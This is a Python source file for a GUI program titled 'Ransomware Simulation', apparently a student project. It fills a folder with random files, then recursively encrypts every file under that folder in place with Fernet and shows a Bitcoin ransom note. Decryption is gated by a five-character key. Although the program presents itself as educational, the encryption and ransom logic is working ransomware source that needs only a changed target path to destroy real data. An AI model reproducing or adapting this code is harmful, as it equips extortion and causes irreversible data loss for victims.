import random
import string
from pathlib import Path
import randomfiletree
import tkinter as tk
from tkinter import messagebox, simpledialog
from cryptography.fernet import Fernet
import os
from PIL import Image, ImageTk

# Directory to encrypt files
TARGET_DIRECTORY = Path("D:/CIS pbl/test folder")

EXTENSIONS = [".3ds", ".7z", ".accdb", ".ai", ".asp",
              ".aspx", ".avhd", ".avi", ".back", ".bak",
              ".c", ".cfg", ".conf", ".cpp", ".cs",
              ".ctl", ".dbf", ".disk", ".djvu", ".doc",
              ".docx", ".dwg", ".eml", ".fdb", ".giff",
              ".gz", ".h", ".hdd", ".jpg", ".jpeg",
              ".kdbx", ".mail", ".mdb", ".mpg", ".mpeg",
              ".msg", ".nrg", ".ora", ".ost", ".ova",
              ".ovf", ".pdf", ".php", ".pmf", ".png",
              ".ppt", ".pptx", ".pst", ".pvi", ".py",
              ".pyc", ".rar", ".rtf", ".sln", ".sql",
              ".tar", ".tiff", ".txt", ".vbox", ".vbs",
              ".vcb", ".vdi", ".vfd", ".vmc", ".vmdk",
              ".vmsd", ".vmx", ".vsdx", ".vsv", ".work",
              ".xls", ".xlsx", ".xvd", ".zip"]

# Event to control generation stopping
file_log = []
universal_key_file = 'universal_key.txt'
dynamic_key = Fernet.generate_key()  # Dynamic key for the session
cipher = Fernet(dynamic_key)

# Load or create universal key
if os.path.exists(universal_key_file):
    with open(universal_key_file, 'r') as key_file:
        universal_key = key_file.read().strip()
else:
    # Generate a new universal key of 5 characters
    universal_key = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
    with open(universal_key_file, 'w') as key_file:
        key_file.write(universal_key)  # Save universal key to file

def fname():
    ext = EXTENSIONS[random.randint(0, len(EXTENSIONS) - 1)]
    length = random.randint(5, 10)
    return "".join(
        random.choice(string.ascii_letters + string.digits)
        for _ in range(length)
    ) + ext

def encrypt_file(path):
    """Encrypt a file using the dynamic cipher."""
    with path.open('rb') as file:
        file_content = file.read()
    encrypted_content = cipher.encrypt(file_content)
    with path.open('wb') as file:
        file.write(encrypted_content)
    print(f'Encrypted: {str(path)}')

def decrypt_file(path, provided_key):
    """Decrypt a file using the provided key."""
    if provided_key == universal_key:
        try:
            fernet = Fernet(dynamic_key)  # Use dynamic key for decryption
            with path.open('rb') as file:
                encrypted_content = file.read()
            decrypted_content = fernet.decrypt(encrypted_content)
            with path.open('wb') as file:
                file.write(decrypted_content)
            print(f'Decrypted: {str(path)}')
        except Exception as e:
            print(f"Decryption failed for {path}: {str(e)}")
    else:
        print(f"Invalid decryption key provided for {path}")

def encrypt_files_in_directory(path):
    """Encrypt all files in the specified directory."""
    for file in path.rglob('*'):
        if file.is_file():
            encrypt_file(file)

def generate_random_files(path=TARGET_DIRECTORY, files=10, folders=2, depth=2):
    """Generate random files in the specified directory."""
    randomfiletree.core.iterative_gaussian_tree(
        str(path),
        nfiles=files,
        nfolders=folders,
        repeat=4,
        maxdepth=depth,
        filename=fname
    )

def start_generation():
    """Start the generation and encryption process."""
    try:
        # Generate random files in the target directory
        generate_random_files()
        # Encrypt all files in the target directory
        encrypt_files_in_directory(TARGET_DIRECTORY)
        show_ransom_message()  # Show the ransom message after encryption
        messagebox.showinfo("Success", "Random files created and existing files encrypted successfully!")
    except Exception as e:
        messagebox.showerror("Error", str(e))

def show_ransom_message():
    """Display a ransom note to the user."""
    ransom_message = (
        "All your files have been encrypted!\n"
        "Send 0.01 Bitcoin to the following account to unlock your files:\n"
        "1A2B3C4D5E6F7G8H9I0J\n"
        "After payment, use the decryption key to unlock your files."
    )
    messagebox.showwarning("Ransom Note", ransom_message)

def decrypt_files_in_directory(path, provided_key):
    """Decrypt all files in the specified directory using the provided key."""
    for file in path.rglob('*'):
        if file.is_file():
            decrypt_file(file, provided_key)

def prompt_decrypt_key():
    """Prompt the user for a decryption key and attempt to decrypt files."""
    key_input = simpledialog.askstring("Decryption Key", "Enter the decryption key:")
    if key_input:
        decrypt_files_in_directory(TARGET_DIRECTORY, key_input)
    else:
        messagebox.showinfo("Key", f"Your dynamic decryption key is:\n{dynamic_key.decode()}\n\n"
                                     f"Universal decryption key is:\n{universal_key}")

def show_info():
    """Display information about the simulation."""
    info_message = (
        "This program simulates a ransomware attack by generating and "
        "encrypting random files of various types. The files created can "
        "fill up disk space and demonstrate how ransomware might operate. "
        "Use this software responsibly for educational purposes only.\n\n"
        "Universal Decryption Key:\n"
        f"{universal_key}\n\n"
        "Note: This key can be used to decrypt files after they have been "
        "encrypted during this session."
    )
    messagebox.showinfo("About this Simulation", info_message)

# Create the main window
root = tk.Tk()
root.title("Ransomware Simulation")
root.geometry("600x400")

# Load background image
bg_image = Image.open("D:/CIS pbl/resource/image1.jpg")
bg_image = bg_image.resize((600, 400), Image.LANCZOS)  # Use LANCZOS for resizing
bg_photo = ImageTk.PhotoImage(bg_image)

# Set background label
bg_label = tk.Label(root, image=bg_photo)
bg_label.place(relwidth=1, relheight=1)

# Set the font for buttons
root.option_add("*Font", "Helvetica 12")

# Title Label
title_label = tk.Label(root, text="Ransomware Simulation", bg="#1e1e1e", fg="white")
title_label.pack(pady=20)

# Button styles for transparency (set to match the background color)
button_style = {
    'bg': '#1e1e1e',  # Change this to your background color
    'fg': 'white',
    'padx': 10,
    'pady': 5,
    'borderwidth': 0,
    'highlightthickness': 0,
    'activebackground': '#1e1e1e',  # Same as background color
}

# Create a frame for buttons
button_frame = tk.Frame(root, bg='#1e1e1e')  # Match the frame color
button_frame.pack(pady=(280, 30))  # Adjusted padding to 280

# Start the Attack Button
generate_button = tk.Button(button_frame, text="Start the Attack", command=start_generation, **button_style)
generate_button.pack(side=tk.LEFT, padx=10, pady=5)

# Decrypt Files Button
decrypt_button = tk.Button(button_frame, text="Decrypt Files", command=prompt_decrypt_key, **button_style)
decrypt_button.pack(side=tk.LEFT, padx=10, pady=5)

# About Button
about_button = tk.Button(button_frame, text="About", command=show_info, **button_style)
about_button.pack(side=tk.LEFT, padx=10, pady=5)

# Run the application
root.mainloop()
